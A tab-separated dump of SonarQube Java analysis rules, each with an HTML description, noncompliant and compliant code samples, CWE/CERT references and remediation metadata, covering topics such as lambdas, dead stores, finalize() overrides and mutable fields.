645	@FunctionalInterface annotation should be used to flag Single Abstract Method interfaces	S1609	S1609	squid	<p>A Single Abstract Method (SAM) interface is a Java interface containing only one method. The Java API is full of SAM interfaces, such as <code>java.lang.Runnable</code>, <code>java.awt.event.ActionListener</code>, <code>java.util.Comparator</code> and <code>java.util.concurrent.Callable</code>. SAM interfaces have a special place in Java 8 because they can be implemented using Lambda expressions or Method references. </p>\n<p>Using <code>@FunctionalInterface</code> forces a compile break when an additional, non-overriding abstract method is added to a SAM, which would break the use of Lambda implementations.</p>\n\n<p>\n  <strong>Note</strong> that this rule is automatically disabled when the project's <code>sonar.java.source</code> is lower than <code>8</code>.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n\n<pre>\npublic interface Changeable&lt;T&gt; {\n  public void change(T o);\n}\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\n@FunctionalInterface\npublic interface Changeable&lt;T&gt; {\n  public void change(T o);\n}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	java8	f	HTML	1511453807184	1511453807184	1
646	Classes should not be too complex	ClassCyclomaticComplexity	ClassCyclomaticComplexity	squid	<p>The Cyclomatic Complexity is measured by the number of <code>&amp;&amp;</code> and <code>||</code> operators and <code>if</code>, <code>while</code>, <code>do</code>, <code>for</code>, <code>?:</code>, <code>catch</code>, <code>switch</code>, <code>case</code>, <code>return</code> and <code>throw</code> statements in the body of a class plus one for each constructor, method, static initializer, or instance initializer in the class. The last return statement in method, if exists, is not taken into account.</p>\n<p>Even when the Cyclomatic Complexity of a class is very high, this complexity might be well distributed among all methods. Nevertheless, most of the time, a very complex class is a class which breaks the Single Responsibility Principle and which should be re-factored to be split in several classes.</p>	2	\N	READY	java	\N	\N	\N	\N	\N	LINEAR_OFFSET	\N	1min	\N	10min	per complexity point over the threshold	\N	brain-overload	f	HTML	1511453807185	1511453807185	1
647	Parentheses should be removed from a single lambda input parameter when its type is inferred	S1611	S1611	squid	<p>There are two possible syntaxes for a lambda having only one input parameter with an inferred type: with and without parentheses around that single parameter. The simpler syntax, without parentheses, is more compact and readable than the one with parentheses, and is therefore preferred.</p>\n\n<p>\n  <strong>Note</strong> that this rule is automatically disabled when the project's <code>sonar.java.source</code> is lower than <code>8</code>.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\n(x) -> x * 2\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nx -> x * 2\n</pre>	1	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	java8	f	HTML	1511453807186	1511453807187	1
648	Literal boolean values should not be used in assertions	S2701	S2701	squid	<p>There's no reason to use literal boolean values in assertions. Doing so is at best confusing for maintainers, and at worst a bug.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nAssert.assertTrue(true);  // Noncompliant\nassertThat(true).isTrue(); // Noncompliant\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	tests	f	HTML	1511453807187	1511453807188	1
649	Lambdas should be replaced with method references	S1612	S1612	squid	<p>Method/constructor references are more compact and readable than using lambdas, and are therefore preferred.</p>\n\n<p>\n  <strong>Note</strong> that this rule is automatically disabled when the project's <code>sonar.java.source</code> is lower than <code>8</code>.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\n  List<Integer> list = new ArrayList<Integer>();\n  list.add(0);\n  list.add(1);\n  list.add(2);\n\n    list.forEach(n -> { System.out.println(n); });\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\n  List<Integer> list = new ArrayList<Integer>();\n  list.add(0);\n  list.add(1);\n  list.add(2);\n\n  list.forEach(System.out::println);\n</pre>	1	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	java8	f	HTML	1511453807189	1511453807189	1
650	Dead stores should be removed	S1854	S1854	squid	<p>A dead store happens when a local variable is assigned a value, including <code>null</code> that is not read by any subsequent instruction. Calculating or retrieving a value only to then overwrite it or throw it away, could indicate a serious error in the code. Even if it's not an error, it is at best a waste of resources.</p>\n\n<p>Even assigning <code>null</code> to a variable is a dead store if the variable is not subsequently used. Assigning null as a hint to the garbage collector used to be common practice, but is no longer needed and such code should be eliminated.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void pow(int a, int b) {\n  if(b == 0) {\n    return 0;\n  }\n  int x = a;\n  for(int i= 1, i < b, i++) {\n    x = x * a;  //Dead store because the last return statement should return x instead of returning a\n  }\n  return a;\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic void pow(int a, int b) {\n  if(b == 0) {\n    return 0;\n  }\n  int x = a;\n  for(int i= 1, i < b, i++) {\n    x = x * a;\n  }\n  return x;\n}\n</pre>\n\n<h2>See</h2>\n<ul>\n  <li> <a href="http://cwe.mitre.org/data/definitions/563.html">MITRE, CWE-563</a> - Assignment to Variable without Use ('Unused Variable')</li>\n  <li> <a href="https://www.securecoding.cert.org/confluence/x/QYA5">CERT, MSC13-C</a> - Detect and remove unused values</li>\n  <li> <a href="https://www.securecoding.cert.org/confluence/x/S4IyAQ">CERT, MSC13-CPP</a> - Detect and remove unused values</li>\n</ul>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	15min	\N	\N	cert,cwe,suspicious,unused	f	HTML	1511453807189	1511453807190	1
651	"toString()" should never be called on a String object	S1858	S1858	squid	<p>Invoking a method designed to return a string representation of an object which is already a string is a waste of keystrokes. This redundant construction may be optimized by the compiler, but will be confusing in the meantime.</p>\n\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nString message = "hello world";\nSystem.out.println(message.toString()); // Noncompliant;\n</pre>\n\n<h2>Compliant Solution</h2>\n\n<pre>\nString message = "hello world";\nSystem.out.println(message);\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	clumsy,pitfall	f	HTML	1511453807191	1511453807191	1
652	"Object.finalize()" should remain protected (versus public) when overriding	S1174	S1174	squid	<p>The contract of the <code>Object.finalize()</code> method is clear: only the Garbage Collector is supposed to call this method.</p>\n<p>Making this method public is misleading, because it implies that any caller can use it.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\npublic class MyClass {\n\n  @Override\n  public void finalize() {    // Noncompliant\n    /* ... */\n  }\n}\n</pre>\n<h2>See</h2>\n\n<ul>\n<li> <a href="http://cwe.mitre.org/data/definitions/583.html">MITRE, CWE-583</a> - finalize() Method Declared Public</li>\n<li> CERT Java Secure Coding, MET12-J - Do not use finalizers</li>\n</ul>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	cert,cwe	f	HTML	1511453807191	1511453807192	1
653	The signature of "finalize()" should match that of "Object.finalize()"	S1175	S1175	squid	<p><code>Object.finalize()</code> is called by the Garbage Collector sometime after the object becomes unreferenced.</p>\n<p>Overloading this method is misleading:</p>\n<ul>\n<li> The overload will not be called by the Garbage Collector.</li>\n<li> Users are not expected to call <code>Object.finalize()</code> and will get confused.</li>\n</ul>\n<p>Another name should be picked for the method.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\npublic int finalize(int someParameter) {        // Noncompliant\n  /* ... */\n}\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\npublic int someBetterName(int someParameter) {  // Compliant\n  /* ... */\n}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	pitfall	f	HTML	1511453807192	1511453807192	1
654	Mutable members should not be stored or returned directly	S2384	S2384	squid	<p>\n  Mutable objects are those whose state can be changed.\n  For instance, an array is mutable, but a String is not.\n  Mutable class members should never be returned to a caller or accepted and stored directly.\n  Doing so leaves you vulnerable to unexpected changes in your class state.\n</p>\n<p>\n  Instead, a copy of the mutable object should be made, and that copy should be stored or returned.\n</p>\n<p>\n  This rule checks that arrays, collections and Dates are not stored or returned directly.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nclass A {\n  private String [] strings;\n\n  public A () {\n    strings = new String[]{"first", "second"};\n  }\n\n  public String [] getStrings() {\n    return strings; // Noncompliant\n  }\n\n  public void setStrings(String [] strings) {\n    this.strings = strings;  // Noncompliant\n  }\n}\n\npublic class B {\n\n  private A a = new A();  // At this point a.strings = {"first", "second"};\n\n  public void wreakHavoc() {\n    a.getStrings()[0] = "yellow";  // a.strings = {"yellow", "second"};\n  }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nclass A {\n  private String [] strings;\n\n  public A () {\n    strings = new String[]{"first", "second"};\n  }\n\n  public String [] getStrings() {\n    return strings.clone();\n  }\n\n  public void setStrings(String [] strings) {\n    this.strings = strings.clone();\n  }\n}\n\npublic class B {\n\n  private A a = new A();  // At this point a.strings = {"first", "second"};\n\n  public void wreakHavoc() {\n    a.getStrings()[0] = "yellow";  // a.strings = {"first", "second"};\n  }\n}\n</pre>\n\n<h2>See</h2>\n<ul>\n  <li><a href="http://cwe.mitre.org/data/definitions/374">MITRE, CWE-374 - Passing Mutable Objects to an Untrusted Method</a></li>\n  <li><a href="http://cwe.mitre.org/data/definitions/375">MITRE, CWE-375 - Returning a Mutable Object ot an Untrusted Caller</a></li>\n  <li><a href="https://www.securecoding.cert.org/confluence/x/zQCuAQ">CERT, OBJ05-J - Defensively copy private mutable class members before returning their references</a></li>\n</ul>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	cert,cwe,unpredictable	f	HTML	1511453807193	1511453807193	3
655	"InterruptedException" should not be ignored	S2142	S2142	squid	<p><code>InterruptedExceptions</code> should never be ignored in the code, and simply logging the exception counts in this case as "ignoring". Instead, <code>InterruptedExceptions</code> should either be rethrown - immediately or after cleaning up the method's state - or the method should be reinterrupted. Any other course of action risks delaying thread shutdown and loses the information that the thread was interrupted - probably without finishing its task.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void run () {\n  try {\n    while (true) { \n      // do stuff\n    }\n  }catch (InterruptedException e) { // Noncompliant; logging is not enough\n    LOGGER.log(Level.WARN, "Interrupted!", e);\n  }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic void run () throws InterruptedException{\n  try {\n    while (true) { \n      // do stuff\n    }\n  }catch (InterruptedException e) {\n    LOGGER.log(Level.WARN, "Interrupted!", e);\n    // clean up state...\n    throw e;\n  }\n}\n</pre>\n<p>or</p>\n<pre>\npublic void run () {\n  try {\n    while (true) { \n      // do stuff\n    }\n  }catch (InterruptedException e) {\n    LOGGER.log(Level.WARN, "Interrupted!", e);\n    // clean up state...\n    Thread.currentThread().interrupt();\n  }\n}\n</pre>\n\n<h2>See</h2>\n<ul>\n<li> <a href="http://cwe.mitre.org/data/definitions/391.html">MITRE, CWE-391</a> - Unchecked Error Condition\n</li></ul>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	15min	\N	\N	cwe,multi-threading	f	HTML	1511453807194	1511453807194	2
656	Child class members should not shadow parent class members	S2387	S2387	squid	<p>Having a variable with the same name in two unrelated classes is fine, but do the same thing within a class hierarchy and you'll get confusion at best,\nchaos at worst. Perhaps even worse is the case where a child class field varies from the name of a parent class only by case.</p>\n\n<p>This rule ignores <code>private</code> parent class members, but in all other such cases, the child class field should be renamed.</p>\n\n<h2>Noncompliant Code Example</h2>\n\n<pre>\npublic class Fruit {\n  protected Season ripe;\n  protected Color flesh;\n\n  // ...\n}\n\npublic class Raspberry extends Fruit {\n  private boolean ripe;  // Noncompliant\n  private static Color FLESH; // Noncompliant\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n\n<pre>\npublic class Fruit {\n  protected Season ripe;\n  protected Color flesh;\n\n  // ...\n}\n\npublic class Raspberry extends Fruit {\n  private boolean ripened;\n  private static Color FLESH_COLOR;\n}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	confusing	f	HTML	1511453807195	1511453807195	1
657	Web applications should use validation filters	S3355	S3355	squid	<p>Specifying a validation filter for all input in your <code>web.xml</code> allows you to scrub all your HTTP parameters in one central place. To do so, you'll need to define a validator, and a filtering class that uses it, then set up the filter's use in <code>web.xml</code>.</p>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic class ValidatingHttpRequest extends HttpServletRequestWrapper {\n  // ...\n}\n\npublic class ValidationFilter implements javax.servlet.Filter {\n  public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) {\n    chain.doFilter(new ValidatingHttpRequest( (HttpServletRequest)request ), response);\n  }\n}\n</pre>\n<p>and</p>\n<pre>\n  &lt;filter&gt;\n     &lt;filter-name&gt;ValidationFilter&lt;/filter-name&gt;\n     &lt;filter-class&gt;com.myco.servlet.ValidationFilter&lt;/filter-class&gt;\n  &lt;/filter&gt;\n       \n  &lt;filter-mapping&gt;\n     &lt;filter-name&gt;ValidationFilter&lt;/filter-name&gt;\n     &lt;url-pattern&gt;/*&lt;/url-pattern&gt;\n  &lt;/filter-mapping&gt;\n</pre>\n\n<h2>See</h2>\n<ul>\n<li> <a href="https://www.owasp.org/index.php/Top_10_2013-A1-Injection">OWASP Top Ten 2013 Category A1</a> - Injection\n</li><li> <a href="https://www.owasp.org/index.php/How_to_add_validation_logic_to_HttpServletRequest">OWASP, How to add validation logic to HttpServletRequest</a>\n</li></ul>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	30min	\N	\N	injection,owasp-a1	f	HTML	1511453807195	1511453807196	3
658	Mutable fields should not be "public static"	S2386	S2386	squid	<p>There is no good reason to have a mutable object as the <code>public</code> (by default), <code>static</code> member of an <code>interface</code>. Such variables should be moved into classes and their visibility lowered. </p>\n<p>Similarly, mutable <code>static</code> members of classes and enumerations which are accessed directly, rather than through getters and setters, should be protected to the degree possible. That can be done by reducing visibility or making the field <code>final</code> if appropriate. </p>\n<p>Note that making a mutable field, such as an array, <code>final</code> will keep the variable from being reassigned, but doing so has no effect on the mutability of the internal state of the array (i.e. it doesn't accomplish the goal).</p>\n<p>This rule raises issues for <code>public static</code> array, <code>Collection</code>, <code>Date</code>, and <code>awt.Point</code> members.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\npublic interface MyInterface {\n  public static String [] strings; // Noncompliant\n}\n\npublic class A {\n  public static String [] strings1 = {"first","second"};  // Noncompliant\n  public static String [] strings2 = {"first","second"};  // Noncompliant\n  public static List&lt;String&gt; strings3 = new ArrayList&lt;&gt;();  // Noncompliant\n  // ...\n}\n</pre>\n<h2>See</h2>\n\n<ul>\n  <li> <a href="http://cwe.mitre.org/data/definitions/582.html">MITRE, CWE-582</a> - Array Declared Public, Final, and Static</li>\n  <li> <a href="http://cwe.mitre.org/data/definitions/607.html">MITRE, CWE-607</a> - Public Static Final Field References Mutable Object</li>\n</ul>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	15min	\N	\N	cwe,unpredictable	f	HTML	1511453807196	1511453807197	3
659	Catches should be combined	S2147	S2147	squid	<p>Since Java 7 it has been possible to catch multiple exceptions at once. Therefore, when multiple <code>catch</code> blocks have the same code, they should be combined for better readability.</p>\n<p><strong>Note</strong> that this rule is automatically disabled when the project's <code>sonar.java.source</code> is lower than <code>7</code>.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\ncatch (IOException e) {\n  doCleanup();\n  logger.log(e);\n}\ncatch (SQLException e) {  // Noncompliant\n  doCleanup();\n  logger.log(e);\n}\ncatch (TimeoutException e) {  // Compliant; block contents are different\n  doCleanup();\n  throw e;\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\ncatch (IOException|SQLException e) {\n  doCleanup();\n  logger.log(e);\n}\ncatch (TimeoutException e) {\n  doCleanup();\n  throw e;\n}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	clumsy	f	HTML	1511453807197	1511453807197	1
660	"instanceof" operators that always return "true" or "false" should be removed	S1850	S1850	squid	<p><code>instanceof</code> operators that always return <code>true</code> or <code>false</code> are either useless or the result of a misunderstanding which could lead to unexpected behavior in production.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\npublic boolean isSuitable(Integer param) {\n...\n  if(param instanceof Number) {  //Always true as param is an Integer, unless param is null\n    doSomething();\n  }\n...\n}\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\npublic boolean isSuitable(Integer param) {\n...\n  doSomething();\n...\n}\n</pre>\n<h2>See</h2>\n\n<ul>\n<li> <a href="http://cwe.mitre.org/data/definitions/571.html">MITRE, CWE-571</a> - Expression is Always True</li>\n<li> <a href="http://cwe.mitre.org/data/definitions/570.html">MITRE, CWE-570</a> - Expression is Always False</li>\n</ul>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	cwe	f	HTML	1511453807198	1511453807198	2
661	Inner class calls to super class methods should be unambiguous	S2388	S2388	squid	<p>When an inner class extends another class, and both its outer class and its parent class have a method with the same name, calls to that method can be confusing. The compiler will resolve the call to the superclass method, but maintainers may be confused, so the superclass method should be called explicitly, using <code>super.</code>.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\npublic class Parent {\n  public void foo() { ... }\n}\n\npublic class Outer {\n\n  public void foo() { ... }\n\n  public class Inner extends Parent {\n\n    public void doTheThing() {\n      foo();  // Noncompliant; was Outer.this.foo() intended instead?\n      // ...\n    }\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\npublic class Parent {\n  public void foo() { ... }\n}\n\npublic class Outer {\n\n  public void foo() { ... }\n\n  public class Inner extends Parent {\n\n    public void doTheThing() {\n      super.foo();\n      // ...\n    }\n  }\n}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	pitfall	f	HTML	1511453807199	1511453807199	1
662	Abstract classes without fields should be converted to interfaces	S1610	S1610	squid	<p>With Java 8's "default method" feature, any abstract class without direct or inherited field should be converted into an interface.</p>\n\n<p>\n  <strong>Note</strong> that this rule is automatically disabled when the project's <code>sonar.java.source</code> is lower than <code>8</code>.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic abstract class Car {\n  public abstract void start(Environment c);\n\n  public void stop(Environment c) {\n    c.freeze(this);\n  }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic interface Car {\n  public void start(Environment c);\n\n  public default void stop(Environment c) {\n    c.freeze(this);\n  }\n}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	java8	f	HTML	1511453807200	1511453807200	1
663	Unused local variables should be removed	S1481	S1481	squid	<p>If a local variable is declared but not used, it is dead code and should be removed. Doing so will improve maintainability because developers will not wonder what the variable is used for.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\npublic int numberOfMinutes(int hours) {\n  int seconds = 0;   // seconds is never used \n  return hours * 60;\n}\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\npublic int numberOfMinutes(int hours) {\n  return hours * 60;\n}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	unused	f	HTML	1511453807200	1511453807200	1
664	"switch" statements should end with a "default" clause	SwitchLastCaseIsDefaultCheck	SwitchLastCaseIsDefaultCheck	squid	<p>The requirement for a final <code>default</code> clause is defensive programming. The clause should either take appropriate action, or contain a suitable comment as to why no action is taken.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nswitch (param) {  //missing default clause\n  case 0:\n    doSomething();\n    break;\n  case 1:\n    doSomethingElse();\n    break;\n}\n\nswitch (param) {\n  default: // default clause should be the last one\n    error();\n    break;\n  case 0:\n    doSomething();\n    break;\n  case 1:\n    doSomethingElse();\n    break;\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nswitch (param) {\n  case 0:\n    doSomething();\n    break;\n  case 1:\n    doSomethingElse();\n    break;\n  default:\n    error();\n    break;\n}\n</pre>\n\n<h2>See</h2>\n\n<ul>\n<li> MISRA C:2004, 15.0 - The MISRA C <em>switch</em> syntax shall be used.</li>\n<li> MISRA C:2004, 15.3 - The final clause of a switch statement shall be the default clause</li>\n<li> MISRA C++:2008, 6-4-3 - A switch statement shall be a well-formed switch statement.</li>\n<li> MISRA C++:2008, 6-4-6 - The final clause of a switch statement shall be the default-clause</li>\n<li> MISRA C:2012, 16.1 - All switch statements shall be well-formed</li>\n<li> MISRA C:2012, 16.4 - Every <em>switch</em> statement shall have a <em>default</em> label</li>\n<li> MISRA C:2012, 16.5 - A <em>default</em> label shall appear as either the first or the last <em>switch label</em> of a <em>switch</em> statement</li>\n<li> <a href="http://cwe.mitre.org/data/definitions/478.html">MITRE, CWE-478</a> - Missing Default Case in Switch Statement</li>\n<li> <a href="https://www.securecoding.cert.org/confluence/x/YgE">CERT, MSC01-C</a> - Strive for logical completeness</li>\n<li> <a href="https://www.securecoding.cert.org/confluence/x/JoIyAQ">CERT, MSC01-CPP</a> - Strive for logical completeness</li>\n</ul>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	cert,cwe,misra	f	HTML	1511453807201	1511453807202	1
665	"@Deprecated" code should not be used	CallToDeprecatedMethod	CallToDeprecatedMethod	squid	<p>Once deprecated, classes, and interfaces, and their members should be avoided, rather than used, inherited or extended. Deprecation is a warning that the class or interface has been superseded, and will eventually be removed. The deprecation period allows you to make a smooth transition away from the aging, soon-to-be-retired technology.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\n/**\n * @deprecated  As of release 1.3, replaced by {@link #Fee}\n */@Deprecated\nclass Fum { ... }\n\npublic class Bar extends Fum {  // Noncompliant; Fum is deprecated\n\n  public void myMethod() {\n    Foo foo = new Foo();  // okay; the class isn't deprecated\n    foo.doTheThing();  // Noncompliant\n  }\n}\n</pre>\n\n<h2>See</h2>\n<ul>\n<li> <a href="http://cwe.mitre.org/data/definitions/477.html">MITRE, CWE-477</a> - Use of Obsolete Functions\n</li><li> <a href="https://www.securecoding.cert.org/confluence/x/KgAVAg">CERT, MET02-J.</a> - Do not use deprecated or obsolete classes or methods\n</li></ul>	1	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	15min	\N	\N	cwe,obsolete	f	HTML	1511453807202	1511453807202	1
666	Constructor injection should be used instead of field injection	S3306	S3306	squid	<p>Field injection seems like a tidy way to get your classes what they need to do their jobs, but it's really a <code>NullPointerException</code> waiting to happen unless all your class constructors are <code>private</code>. That's because any class instances that are constructed by callers, rather than instantiated by the Spring framework, won't have the ability to perform the field injection.</p>\n<p>Instead <code>@Inject</code> should be moved to the constructor and the fields required as constructor parameters.</p>\n<p>This rule raises an issue when classes with non-<code>private</code> constructors (including the default constructor) use field injection.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nclass MyComponent {  // Anyone can call the default constructor \n \n  @Inject MyCollaborator collaborator;  // Noncompliant\n  \n  public void myBusinessMethod() {\n    collaborator.doSomething();  // this will fail in classes new-ed by a caller\n  }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nclass MyComponent {\n \n  private final MyCollaborator collaborator;\n  \n  @Inject\n  public MyComponent(MyCollaborator collaborator) {\n    Assert.notNull(collaborator, "MyCollaborator must not be null!");\n    this.collaborator = collaborator;\n  }\n\n  public void myBusinessMethod() {\n    collaborator.doSomething();\n  }\n}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	design,pitfall	f	HTML	1511453807203	1511453807203	1
669	"indexOf" checks should not be for positive numbers	S2692	S2692	squid	<p>Most checks against an <code>indexOf</code> value compare it with -1 because 0 is a valid index. Any checks which look for values &gt;0 ignore the first element, which is likely a bug.\nIf the intent is merely to check inclusion of a value in a <code>String</code> or a <code>List</code>, consider using the <code>contains</code> method instead.</p>\n\n<p>For strings, if the intent is truly to find the first index after a specific character index, then use the version of <code>indexOf</code> which takes a start position argument.</p>\n\n<p>This rule raises an issue any time an <code>indexOf</code> value retrieved either from a <code>String</code> or a <code>List</code> is tested for a positive value.</p>\n\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nString color = "blue";\nString name = "ishmael";\n\nList&lt;String&gt; strings = new ArrayList&lt;String&gt;();\nstrings.add(color);\nstrings.add(name);\n\nif (strings.indexOf(color) &gt; 0) {  // Noncompliant\n  // ...\n}\nif (name.indexOf("ish") &gt; 0) { // Noncompliant\n  // ...\n}\nif (name.indexOf("hma") &gt; 2) { // Noncompliant\n  // ...\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n\n<pre>\nString color = "blue";\nString name = "ishmael";\n\nList&lt;String&gt; strings = new ArrayList&lt;String&gt;();\nstrings.add(color);\nstrings.add(name);\n\nif (strings.indexOf(color) &gt; -1) {\n  // ...\n}\nif (name.indexOf("ish") &gt;= 0) {\n  // ...\n}\nif (name.indexOf("hma") &gt; -1) {\n  // ...\n}\n</pre>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	pitfall	f	HTML	1511453807205	1511453807205	1
670	"PreparedStatement" and "ResultSet" methods should be called with valid indices	S2695	S2695	squid	<p>The parameters in a <code>PreparedStatement</code> are numbered from 1, not 0, so using any set method of a <code>PreparedStatement</code> with a number less than 1 is a bug, as is using an index higher than the number of parameters. Similarly, <code>ResultSet</code> indices also start at 1, rather than 0.</p>\n\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nPreparedStatement ps = con.prepareStatement("SELECT fname, lname FROM employees where hireDate > ? and salary < ?");\nps.setDate(0, date);  // Noncompliant\nps.setDouble(3, salary);  // Noncompliant\n\nResultSet rs = ps.executeQuery();\nwhile (rs.next()) {\n  String fname = rs.getString(0);  // Noncompliant\n  // ...\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n\n<pre>\nPreparedStatement ps = con.prepareStatement("SELECT fname, lname FROM employees where hireDate > ? and salary < ?");\nps.setDate(1, date);\nps.setDouble(2, salary);\n\nResultSet rs = ps.executeQuery();\nwhile (rs.next()) {\n  String fname = rs.getString(1);\n  // ...\n}\n</pre>	4	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	sql	f	HTML	1511453807206	1511453807206	2
671	Deprecated "${pom}" properties should not be used	S3421	S3421	squid	<p>Deprecated features are those that have been retained temporarily for backward compatibility, but which will eventually be removed. In effect, deprecation announces a grace period to allow the smooth transition from the old features to the new ones. In that period, no use of the deprecated features should be added, and all existing uses should be gradually removed.</p>\n<p>This rule raises an issue when <code>${pom.*}</code> properties are used in a pom.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\n  &lt;build&gt;\n    &lt;finalName&gt;${pom.artifactId}-${pom.version}&lt;/finalName&gt;  &lt;!-- Noncompliant --&gt;\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\n  &lt;build&gt;\n    &lt;finalName&gt;${project.artifactId}-${project.version}&lt;/finalName&gt;\n</pre>\n<p>or</p>\n<pre>\n  &lt;build&gt;\n    &lt;finalName&gt;${artifactId}-${version}&lt;/finalName&gt;\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	maven,obsolete	f	HTML	1511453807207	1511453807207	1
672	Inner classes which do not reference their owning classes should be "static"	S2694	S2694	squid	<p>\n  A non-static inner class has a reference to its outer class, and access to the outer class' fields and methods.\n  That class reference makes the inner class larger and could cause the outer class instance to live in memory longer than necessary.\n</p>\n<p>\n  If the reference to the outer class isn't used, it is more efficient to make the inner class <code>static</code> (also called nested).\n  If the reference is used only in the class constructor, then explicitly pass a class reference to the constructor.\n  If the inner class is anonymous, it will also be necessary to name it.\n</p>\n<p>\n  However, while a nested/<code>static</code> class would be more efficient,\n  it's worth nothing that there are semantic differences between an inner class and a nested one:\n</p>\n<ul>\n  <li>an inner class can only be instantiated within the context of an instance of the outer class.</li>\n  <li>a nested (<code>static</code>) class can be instantiated independently of the outer class.</li>\n</ul>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Fruit {\n  // ...\n\n  public class Seed {  // Noncompliant; there's no use of the outer class reference so make it static\n    int germinationDays = 0;\n    public Seed(int germinationDays) {\n      this.germinationDays = germinationDays;\n    }\n    public int getGerminationDays() {\n      return germinationDays;\n    }\n  }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic class Fruit {\n  // ...\n\n  public static class Seed {\n    int germinationDays = 0;\n    public Seed(int germinationDays) {\n      this.germinationDays = germinationDays;\n    }\n    public int getGerminationDays() {\n      return germinationDays;\n    }\n  }\n}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	15min	\N	\N	performance	f	HTML	1511453807207	1511453807208	1
